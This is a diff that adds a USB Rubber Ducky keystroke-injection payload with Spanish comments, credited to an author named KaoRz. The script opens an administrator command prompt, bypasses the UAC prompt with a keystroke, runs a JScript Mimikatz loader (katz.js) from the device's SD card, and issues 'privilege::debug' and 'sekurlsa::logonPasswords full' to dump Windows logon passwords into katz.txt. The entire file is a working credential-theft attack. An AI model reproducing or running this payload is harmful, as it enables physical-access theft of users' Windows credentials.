@@ -1,0 +1,36 @@
+REM Author: KaoRz
+REM Name: duckykatz2txtoffline
+REM Este sencillo payload se encargará de ejecutar el script de subTee - katz.js
+REM para extraer las contraseñas de Windows y guardarlas en la SD en un archivo TXT
+DELAY 3000
+CONTROL ESCAPE
+DELAY 1000
+STRING cmd
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 3000
+STRING for %d in (A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z) do %d: && cscript .\katz.js
+ENTER
+REM Ahora hay que tener cuidado a la hora de poner los proximos delays debido a que
+REM el JScript tardará más o menos dependiendo de lo que tarde en procesarlo el ordenador
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+STRING log katz.txt
+ENTER
+DELAY 300
+STRING privilege::debug
+ENTER
+DELAY 300
+STRING sekurlsa::logonPasswords full
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+DELAY 300
+STRING exit
+ENTER
